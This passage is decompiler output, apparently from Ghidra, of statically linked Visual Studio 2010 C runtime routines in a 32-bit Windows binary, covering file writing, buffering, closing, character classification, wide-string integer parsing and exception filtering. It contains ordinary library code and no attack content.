          bVar1 = *(byte *)puVar13;
          puVar13 = (ushort *)((int)puVar13 + 1);
          uVar12 = uVar12 + 1;
          if (bVar1 == 10) {
            local_1ad4 = local_1ad4 + 1;
            *(byte *)puVar10 = 0xd;
            puVar10 = (ushort *)((int)puVar10 + 1);
            uVar14 = uVar14 + 1;
          }
          *(byte *)puVar10 = bVar1;
          puVar10 = (ushort *)((int)puVar10 + 1);
          uVar14 = uVar14 + 1;
          local_1ae4 = puVar13;
        } while (uVar14 < 0x13ff);
        BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                          (int)puVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
        if (BVar9 == 0) goto LAB_003b9353;
        local_1acc = local_1acc + local_1adc;
        in_EDX = extraout_EDX_12;
      } while (((int)puVar10 - (int)local_1abc <= (int)local_1adc) &&
              ((uint)((int)puVar13 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_003b935f;
    }
    if (local_1ac5 == '\x02') {
      puVar13 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)puVar13 - (int)local_1ad0;
          puVar10 = local_1abc;
          do {
            if (_MaxCharCount <= uVar12) break;
            uVar2 = *puVar13;
            puVar13 = puVar13 + 1;
            uVar12 = uVar12 + 2;
            if (uVar2 == 10) {
              local_1ad4 = local_1ad4 + 2;
              *puVar10 = 0xd;
              puVar10 = puVar10 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *puVar10 = uVar2;
            puVar10 = puVar10 + 1;
            local_1ae4 = puVar13;
          } while (local_1ac4 < 0x13fe);
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                            (int)puVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_003b9353;
          local_1acc = local_1acc + local_1adc;
          in_EDX = extraout_EDX_13;
        } while (((int)puVar10 - (int)local_1abc <= (int)local_1adc) &&
                ((uint)((int)puVar13 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_003b935f;
      }
    }
    else {
      local_1ad8 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)local_1ad8 - (int)local_1ad0;
          puVar13 = local_6bc;
          do {
            if (_MaxCharCount <= uVar12) break;
            uVar2 = *local_1ad8;
            local_1ad8 = local_1ad8 + 1;
            uVar12 = uVar12 + 2;
            if (uVar2 == 10) {
              *puVar13 = 0xd;
              puVar13 = puVar13 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *puVar13 = uVar2;
            puVar13 = puVar13 + 1;
          } while (local_1ac4 < 0x6a8);
          iVar15 = 0;
          iVar7 = WideCharToMultiByte(0xfde9,0,(LPCWSTR)local_6bc,
                                      ((int)puVar13 - (int)local_6bc) / 2,local_1414,0xd55,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar7 == 0) goto LAB_003b9353;
          do {
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1414 + iVar15,iVar7 - iVar15,
                              &local_1adc,(LPOVERLAPPED)0x0);
            if (BVar9 == 0) {
              local_1ac0 = GetLastError();
              in_EDX = extraout_EDX_15;
              break;
            }
            iVar15 = iVar15 + local_1adc;
            in_EDX = extraout_EDX_14;
          } while (iVar15 < iVar7);
        } while ((iVar7 <= iVar15) &&
                (local_1acc = (int)local_1ad8 - (int)local_1ad0, local_1acc < _MaxCharCount));
        goto LAB_003b935f;
      }
    }
  }
  else {
    p_Var8 = __getptd();
    pwVar3 = p_Var8->ptlocinfo->lc_category[0].wlocale;
    BVar9 = GetConsoleMode(*(HANDLE *)(iVar11 + *piVar6),(LPDWORD)&local_1ae4);
    in_EDX = extraout_EDX_02;
    if ((BVar9 == 0) || ((pwVar3 == (wchar_t *)0x0 && (local_1ac5 == '\0')))) goto LAB_003b9072;
    local_1ae4 = (ushort *)GetConsoleCP();
    local_1ad8 = (ushort *)0x0;
    in_EDX = extraout_EDX_03;
    if (_MaxCharCount != 0) {
      local_1ac4 = 0;
      puVar13 = local_1ad0;
      do {
        piVar6 = local_1ae0;
        if (local_1ac5 == '\0') {
          bVar1 = *(byte *)puVar13;
          in_stack_ffffe518 = (uint)(bVar1 == 10);
          iVar7 = *local_1ae0 + iVar11;
          if (*(int *)(iVar7 + 0x38) == 0) {
            iVar7 = _isleadbyte((int)(char)bVar1);
            if (iVar7 == 0) {
              _SrcSizeInBytes = 1;
              puVar10 = puVar13;
              goto LAB_003b8ed9;
            }
            if ((byte *)((int)local_1ad0 + (_MaxCharCount - (int)puVar13)) < (byte *)0x2) {
              in_EDX = extraout_EDX_04 & 0xffffff00 | (uint)*(byte *)puVar13;
              local_1acc = local_1acc + 1;
              *(byte *)(iVar11 + 0x34 + *piVar6) = *(byte *)puVar13;
              *(undefined4 *)(iVar11 + 0x38 + *piVar6) = 1;
              break;
            }
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)puVar13,2);
            in_EDX = extraout_EDX_05;
            if (iVar7 == -1) break;
            puVar13 = (ushort *)((int)puVar13 + 1);
            local_1ac4 = local_1ac4 + 1;
          }
          else {
            local_10 = *(undefined *)(iVar7 + 0x34);
            *(undefined4 *)(iVar7 + 0x38) = 0;
            _SrcSizeInBytes = 2;
            puVar10 = (ushort *)&local_10;
            local_f = bVar1;
LAB_003b8ed9:
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)puVar10,_SrcSizeInBytes);
            in_EDX = extraout_EDX_06;
            if (iVar7 == -1) break;
          }
          puVar13 = (ushort *)((int)puVar13 + 1);
          local_1ac4 = local_1ac4 + 1;
          nNumberOfBytesToWrite =
               WideCharToMultiByte((UINT)local_1ae4,0,(LPCWSTR)&local_1ac0,1,&local_10,5,(LPCSTR)0x0
                                   ,(LPBOOL)0x0);
          in_EDX = extraout_EDX_07;
          if (nNumberOfBytesToWrite == 0) break;
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_003b9353;
          local_1acc = local_1ac4 + local_1ad4;
          in_EDX = extraout_EDX_08;
          if ((int)local_1ad8 < (int)nNumberOfBytesToWrite) break;
          if (in_stack_ffffe518 != 0) {
            local_10 = 0xd;
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,1,(LPDWORD)&local_1ad8,
                              (LPOVERLAPPED)0x0);
            if (BVar9 == 0) goto LAB_003b9353;
            in_EDX = extraout_EDX_09;
            if ((int)local_1ad8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            local_1ac0 = (DWORD)*puVar13;
            in_stack_ffffe518 = (uint)(local_1ac0 == 10);
            puVar13 = puVar13 + 1;
            local_1ac4 = local_1ac4 + 2;
          }
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            wVar4 = __putwch_nolock((wchar_t)local_1ac0);
            if (wVar4 != (wint_t)local_1ac0) goto LAB_003b9353;
            local_1acc = local_1acc + 2;
            in_EDX = extraout_EDX_10;
            if (in_stack_ffffe518 != 0) {
              local_1ac0 = 0xd;
              wVar4 = __putwch_nolock(L'\r');
              if (wVar4 != (wint_t)local_1ac0) goto LAB_003b9353;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
              in_EDX = extraout_EDX_11;
            }
          }
        }
      } while (local_1ac4 < _MaxCharCount);
      goto LAB_003b935f;
    }
LAB_003b9368:
    if (local_1ac0 != 0) {
      if (local_1ac0 == 5) {
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
        in_EDX = extraout_EDX_18;
      }
      else {
        __dosmaperr(local_1ac0);
        in_EDX = extraout_EDX_19;
      }
      goto LAB_003b93e1;
    }
  }
LAB_003b939e:
  if (((*(byte *)(iVar11 + 4 + *local_1ae0) & 0x40) == 0) || (*(byte *)local_1ad0 != 0x1a)) {
    piVar6 = __errno();
    *piVar6 = 0x1c;
    puVar5 = ___doserrno();
    *puVar5 = 0;
    in_EDX = extraout_EDX_20;
  }
LAB_003b93e1:
  iVar11 = terminate_if_debugger_present
                     (local_8 ^ (uint)&stack0xfffffffc,in_EDX,(char)in_stack_ffffe518);
  return iVar11;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2010 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_003b94bb();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_003b60f9();
  }
  return -1;
}



void FUN_003b94bb(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2010 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_003ea060)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_003ea060)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_003b957c;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_003b957c:
        FUN_003b9594();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_003b60f9();
  }
  return 0xffffffff;
}



void FUN_003b9594(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_003b60f9();
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_003d6e00;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_003ea060)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return 0xffffffff;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2010 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_003ea060 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_003ea060 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_003b9755;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_003b9757;
    }
  }
LAB_003b9755:
  DVar4 = 0;
LAB_003b9757:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2010 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_003b9847();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_003b60f9();
  }
  return -1;
}



void FUN_003b9847(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2010 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,(_locale_t)&local_1c);
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = (CHAR)_C;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = (CHAR)_C;
    }
    BVar2 = ___crtGetStringTypeA
                      ((_locale_t)&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage
                       ,(BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// WARNING: Removing unreachable block (ram,0x003b9acb)
// WARNING: Removing unreachable block (ram,0x003b9b5b)
// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2010 Release

unsigned___int64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wint_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wint_t *pwVar6;
  ulonglong uVar7;
  ushort uVar8;
  _LocaleUpdate local_34 [8];
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate(local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_003b60f9();
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  uVar8 = *(ushort *)param_2;
  local_c._0_4_ = 0;
  local_c._4_4_ = 0;
  pwVar1 = (wint_t *)param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = _iswctype(uVar8,8);
    if (iVar3 == 0) break;
    uVar8 = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (uVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_003b99e5:
    uVar8 = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else {
    if (uVar8 == 0x2b) goto LAB_003b99e5;
  }
  uVar5 = (uint)uVar8;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(uVar8);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_003b9a60;
    }
    if ((*pwVar6 != 0x78) && (*pwVar6 != 0x58)) {
      param_4 = 8;
      goto LAB_003b9a60;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(uVar8), iVar3 == 0)) &&
     ((*pwVar6 == 0x78 || (*pwVar6 == 0x58)))) {
    uVar5 = (uint)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_003b9a60:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar8 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar8);
    if (uVar4 == 0xffffffff) {
      if (((uVar8 < 0x41) || (0x5a < uVar8)) && (0x19 < (ushort)(uVar8 - 0x61))) {
LAB_003b9af8:
        pwVar6 = pwVar6 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (wchar_t **)0x0) {
            pwVar6 = (wint_t *)param_2;
          }
          local_c._0_4_ = 0;
        }
        else {
          if (((param_5 & 4U) != 0) ||
             (((param_5 & 1U) == 0 &&
              ((((param_5 & 2U) != 0 && (0x8000000000000000 < local_c)) ||
               (((param_5 & 2U) == 0 &&
                ((0x7ffffffeffffffff < local_c && (0x7fffffffffffffff < local_c)))))))))) {
            piVar2 = __errno();
            *piVar2 = 0x22;
            if ((param_5 & 1U) == 0) {
              if ((param_5 & 2U) == 0) {
                local_c._0_4_ = 0xffffffff;
              }
              else {
                local_c._0_4_ = 0;
              }
            }
            else {
              local_c._0_4_ = 0xffffffff;
            }
          }
        }
        if (param_3 != (wchar_t **)0x0) {
          *param_3 = (wchar_t *)pwVar6;
        }
        if ((param_5 & 2U) != 0) {
          local_c._0_4_ = -(unsigned___int64)local_c;
        }
        if (local_28 == '\0') {
          return (unsigned___int64)local_c;
        }
        *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
        return (unsigned___int64)local_c;
      }
      if ((ushort)(uVar8 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) goto LAB_003b9af8;
    if ((local_c < local_14) || ((local_14 == local_c && ((local_18 != 0 || (uVar4 <= local_1c))))))
    {
      uVar7 = __allmul(local_24,local_20,(unsigned___int64)local_c,local_c._4_4_);
      local_c = uVar7 + uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) goto LAB_003b9af8;
    }
    uVar5 = (uint)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  unsigned___int64 uVar1;
  undefined4 extraout_EDX;
  undefined **ppuVar2;
  
  if (_DAT_003d7cf8 == 0) {
    ppuVar2 = &PTR_DAT_003d6de4;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = wcstoxq((localeinfo_struct *)ppuVar2,(wchar_t *)_Str,(wchar_t **)_EndPtr,_Radix,0);
  return CONCAT44(extraout_EDX,uVar1);
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2010 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + 0x24);
    if ((puVar1 + 0x24 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else {
      if (pcVar2 == (code *)0x5) {
        puVar6[2] = 0;
        p_Var5 = (_ptiddata)0x1;
      }
      else {
        if (pcVar2 != (code *)0x1) {
          pvVar3 = p_Var5->_tpxcptinfoptrs;
          p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
          if (puVar6[1] == 8) {
            iVar7 = 0x24;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar7 = iVar7 + 0xc;
            } while (iVar7 < 0x90);
            uVar4 = *puVar6;
            iVar7 = p_Var5->_tfpecode;
            if (uVar4 == 0xc000008e) {
              p_Var5->_tfpecode = 0x83;
            }
            else {
              if (uVar4 == 0xc0000090) {
                p_Var5->_tfpecode = 0x81;
              }
              else {
                if (uVar4 == 0xc0000091) {
                  p_Var5->_tfpecode = 0x84;
                }
                else {
                  if (uVar4 == 0xc0000093) {
                    p_Var5->_tfpecode = 0x85;
                  }
                  else {
                    if (uVar4 == 0xc000008d) {
                      p_Var5->_tfpecode = 0x82;
                    }
                    else {
                      if (uVar4 == 0xc000008f) {
                        p_Var5->_tfpecode = 0x86;
                      }
                      else {
                        if (uVar4 == 0xc0000092) {
                          p_Var5->_tfpecode = 0x8a;
                        }
                        else {
                          if (uVar4 == 0xc00002b5) {
                            p_Var5->_tfpecode = 0x8d;
                          }
                          else {
                            if (uVar4 == 0xc00002b4) {
                              p_Var5->_tfpecode = 0x8e;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            (*pcVar2)(8,p_Var5->_tfpecode);
            p_Var5->_tfpecode = iVar7;
          }
          else {
            puVar6[2] = 0;
            (*pcVar2)(puVar6[1]);
          }
          p_Var5->_tpxcptinfoptrs = pvVar3;
        }
        p_Var5 = (_ptiddata)0xffffffff;
      }
    }
  }
  return (int)p_Var5;
}



